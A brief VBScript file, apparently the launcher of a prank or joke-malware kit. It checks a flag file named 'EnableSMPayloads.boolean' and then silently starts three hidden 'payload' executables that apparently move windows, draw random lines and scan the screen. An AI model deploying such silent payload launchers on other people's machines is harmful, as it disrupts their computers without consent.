Function ReadFileToString(readfilepath)
    Set fs2 = CreateObject("Scripting.FileSystemObject") 
    Set file = fs2.OpenTextFile(readfilepath, 1, false) 
    ReadFileToString = file.readall 
    file.close 
    set fs2 = nothing 
end Function
set WSHShell=createobject("wscript.shell")
WSHShell.currentdirectory = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path
dim Enabled
Enabled = ReadFileToString("EnableSMPayloads.boolean")
if Enabled = "false" then
WScript.Quit
end if
WSHShell.Run "MoveWindow.exe", 0
WScript.Sleep 1200
WSHShell.Run "RandomLines_MC.exe", 0
WScript.Sleep 850
WSHShell.Run "ScreenScan.exe", 0